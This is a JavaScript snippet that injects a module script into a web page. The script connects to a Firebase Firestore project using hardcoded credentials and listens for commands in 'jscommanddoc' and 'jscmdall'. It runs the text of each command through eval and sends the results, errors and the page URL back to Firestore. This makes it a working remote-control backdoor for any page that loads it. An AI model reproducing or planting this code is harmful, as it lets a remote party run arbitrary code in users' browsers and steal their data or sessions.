(_ => {
    const ms = document.createElement('script');
    ms.type = "module";
    ms.innerHTML = `
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js'
    import { getFirestore, collection, onSnapshot, doc, setDoc } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js'
    const fConfig = {apiKey: "AIzaSyC3JGX-ydbKCYEpOanFJVpqmcfQ4dsRTKg", authDomain: "fir-0013.firebaseapp.com", projectId: "fir-0013", storageBucket: "fir-0013.appspot.com", messagingSenderId: "93999488005", appId: "1:93999488005:web:c89844afc1b6c03cba506c", measurementId: "G-3JHGRDKG9W"};
    var app = initializeApp(fConfig);
    var db = getFirestore(app);
    var rt = (rdocs)=>{return doc(db, "jscommand", rdocs)};
    const respon = new responf();
    function executef() {
        this.env = {};
        this.exe = function(t) {
            try {const r = eval.call(this.env,t);respon.log(r);} catch (e) {respon.error(e.message);}
        };
    }
    const execute = new executef();
    onSnapshot(rt("jscommanddoc"), (d) => {
        console.log("Current data: ", d.data());
    });
    onSnapshot(rt("jsrespon"), (d) => {
        console.log("Current data: ", d.data());
    });
    onSnapshot(rt("jscommanddoc"), (d) => {
        var t = d.data().text;
        if ((t !== '') && (document.hidden == false)) {
            execute.exe(t);
        };
    });
    onSnapshot(rt("jscmdall"), (d) => {
        var t = d.data().text;
        if (t !== '') {
            execute.exe(t);
        };
    });
    console.log('ok'); //Will remove
    respon.log(location.href + ' is loaded!');
    function responf() {
        this.log = function (t) {
            setDoc(rt("jsrespon"), {
                text: String(t),
                type: String(typeof(t))
            });
            setTimeout(rpclear, 10);
        }
        this.error = function (t) {
            setDoc(rt("jsresponerr"), {
                text: String(t)
            });
            setTimeout(rpclear, 10);
        }
    }
    function rpclear() {
        try {
            setDoc(rt("jsrespon"), {
                text: '',
                type: ''
            });
            setDoc(rt("jsresponerr"), {
                text: ''
            });
        }catch(e) {console.error(e)}
    }
    console.respon = function (t) {
        respon.log(t);
    }
`
    document.body.appendChild(ms);
})()